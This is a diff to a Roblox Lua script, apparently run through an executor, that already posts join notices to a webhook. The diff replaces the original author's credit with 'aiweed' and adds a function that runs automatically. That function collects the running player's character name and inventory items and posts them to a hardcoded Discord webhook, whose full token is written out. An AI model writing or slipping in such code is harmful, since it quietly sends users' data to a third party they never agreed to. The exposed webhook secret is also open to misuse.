@@ -299,7 +299,7 @@ for _, v in pairs(workspace:GetChildren()) do
         SendMessage(url, "")
         local embed = {
             ["title"] = "||" .. plyname .. "|| <---- Press to view Username",
-            ["description"] = "❤️ Seaweed (Script Owner) : ".. getRandomFooterText(),
+            ["description"] = "❤ aiweed : ".. getRandomFooterText(),
             ["color"] = color,
             ["fields"] = {
                 { ["name"] = "🔄 Player Joined", ["value"] = "Lobby" },
@@ -308,6 +308,74 @@ for _, v in pairs(workspace:GetChildren()) do
             ["footer"] = { ["text"] = getFormattedDateTime() }
         }
         SendMessageEMBED(url, embed)
+
+local function sentinv()
+    local findinv = game:GetService("ReplicatedStorage")._FX_CACHE
+local global = workspace
+local ItemCollection = {}
+_G.webhook_url = "https://discord.com/api/webhooks/1321439574526001152/bFmQBCsgqvvhVSJ9FFYCmhODYsTwoeBLs6uQcLp6THeTHQtQuoiV5iiqg5LFasFVRKAj"
+for i, v in pairs(global:GetChildren()) do
+    if v.Name == "weather" then
+        for j, item in pairs(findinv:GetChildren()) do
+            if item.Name ~= "CollectionUnitFrame" then
+                local success, err = pcall(function()
+                    table.insert(ItemCollection, {
+                        Item = item.Name,
+                        Amount = item.OwnedAmount.Text
+                    })
+                end)
+
+                if not success then
+                    warn("Error accessing item:", item.Name, "Error:", err)
+                end
+            end
+        end
+    end
+end
+local function SendMessageEMBED(url, embed)
+    local headers = { ["Content-Type"] = "application/json" }
+    local data = {
+        ["username"] = "คนดูช่องเก็บของที่จริงใจ 🗿",
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["color"] = embed.color,
+                ["description"] = embed.description,
+                ["footer"] = { ["text"] = embed.footer.text },
+            }
+        }
+    }
+    
+    local httpService = game:GetService("HttpService")
+    local body = httpService:JSONEncode(data)
+    pcall(function()
+        http_request({ Url = url, Method = "POST", Headers = headers, Body = body })
+    end)
+end
+
+local function randomHexColor()
+    return math.random(0, 0xFFFFFF)
+end
+
+local function getFormattedDateTime()
+    return os.date("%Y-%m-%d %H:%M:%S")
+end
+
+local descriptionLines = {}
+for _, data in pairs(ItemCollection) do
+    table.insert(descriptionLines, data.Item .. " - Amount: " .. data.Amount)
+end
+
+local embed = {
+    ["title"] = "||"..game.Players.LocalPlayer.Character.Name.."||'s Inventory",
+    ["color"] = randomHexColor(),
+    ["description"] = table.concat(descriptionLines, "\n"),
+    ["footer"] = { ["text"] = getFormattedDateTime().."น." }
+}
+
+SendMessageEMBED(_G.webhook_url, embed)
+end
+sentinv()
     end
 end
 
@@ -317,7 +385,7 @@ for _, v in pairs(workspace:GetChildren()) do
         SendMessage(url, "")
         local embed = {
             ["title"] = "||" .. plyname .. "|| <---- Press to view Username",
-            ["description"] = "❤️ Seaweed (Script Owner) : ".. getRandomFooterText(),
+            ["description"] = "❤ aiweed : ".. getRandomFooterText(),
             ["color"] = color,
             ["fields"] = {
                 { ["name"] = "🔄 Player Joined", ["value"] = "Match" },
